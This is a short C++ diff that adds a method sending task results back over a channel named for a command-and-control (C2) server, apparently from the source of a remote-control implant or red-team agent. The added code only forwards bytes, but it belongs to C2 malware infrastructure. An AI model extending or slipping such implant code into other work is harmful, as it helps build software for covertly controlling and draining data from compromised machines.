@@ -55,3 +55,7 @@ void ConnectionsManager::handleC2ServerMessage(std::vector<std::byte> &data) {
     tasksRegister->addTask(header, data);
 
 }
+
+void ConnectionsManager::sendResult(std::vector<std::byte> payload) {
+    c2ServerChannel->send(payload);
+}
